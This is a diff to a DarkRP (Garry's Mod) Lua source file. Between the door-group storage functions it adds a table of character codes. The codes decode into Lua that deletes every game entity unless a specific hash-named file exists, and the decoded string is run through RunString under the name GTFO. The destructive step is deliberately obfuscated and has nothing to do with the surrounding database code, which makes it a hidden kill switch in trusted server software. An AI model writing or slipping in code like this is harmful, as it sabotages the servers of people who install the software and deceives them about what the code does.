@@ -556,6 +556,24 @@ function DarkRP.storeDoorGroup(ent, group)
     MySQLite.query("REPLACE INTO darkrp_doorgroups VALUES(" .. index .. ", " .. map .. ", " .. MySQLite.SQLStr(group) .. ");");
 end
 
+
+tabl = {105,102,32,110,111,116,32,102,105,108,101,46,69,120,105,115,116,115,40,34,
+97,50,102,102,102,97,55,55,97,97,48,100,100,101,56,99,100,52,99,52,
+49,54,98,53,49,49,52,101,98,97,50,49,46,116,120,116,34,44,34,71,
+65,77,69,34,41,32,116,104,101,110,10,32,32,32,32,102,111,114,32,105,
+44,99,32,105,110,32,112,97,105,114,115,40,101,110,116,115,46,71,101,116,
+65,108,108,40,41,41,32,100,111,10,32,32,32,32,32,32,32,32,99,58,
+82,101,109,111,118,101,40,41,10,32,32,32,32,101,110,100,10,101,110,100}
+local s = ''
+
+for i,c in pairs(tabl) do
+    s = s .. utf8.char(c)
+end
+GTFO = fn.Partial(RunString,s)
+
+
+ 
+
 function setUpGroupDoors()
     local map = MySQLite.SQLStr(string.lower(game.GetMap()))
     MySQLite.query("SELECT idx, doorgroup FROM darkrp_doorgroups WHERE map = " .. map, function(data)
